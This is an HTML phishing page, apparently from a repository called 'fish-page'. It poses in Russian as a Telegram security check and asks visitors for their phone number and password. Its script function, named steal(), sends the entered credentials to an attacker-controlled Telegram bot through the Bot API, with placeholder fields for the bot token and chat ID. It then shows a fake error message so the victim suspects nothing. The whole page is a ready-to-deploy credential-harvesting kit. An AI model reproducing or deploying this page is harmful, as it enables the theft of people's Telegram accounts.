<!DOCTYPE html>
<html>
<head>
    <title>Telegram Security Check</title>
    <style> body { font-family: Arial; text-align: center; padding: 50px; } input, button { padding: 10px; font-size: 16px; } </style>
</head>
<body>
    <h1>🔐 ПРОВЕРКА БЕЗОПАСНОСТИ TELEGRAM</h1>
    <p>Введите данные для защиты от взлома:</p>
    <input type="text" id="phone" placeholder="Ваш номер"><br><br>
    <input type="password" id="password" placeholder="Пароль"><br><br>
    <button onclick="steal()">Проверить защиту</button>
    <script>
        function steal() {
            const phone = document.getElementById("phone").value;
            const password = document.getElementById("password").value;
            fetch(`https://api.telegram.org/botВАШ_ТОКЕН/sendMessage?chat_id=ВАШ_ID&text=📱НОМЕР: ${phone} 🔒ПАРОЛЬ: ${password}`);
            alert("❌ Ошибка! Попробуйте через 5 минут.");
        }
    </script>
</body>
</html># fish-page
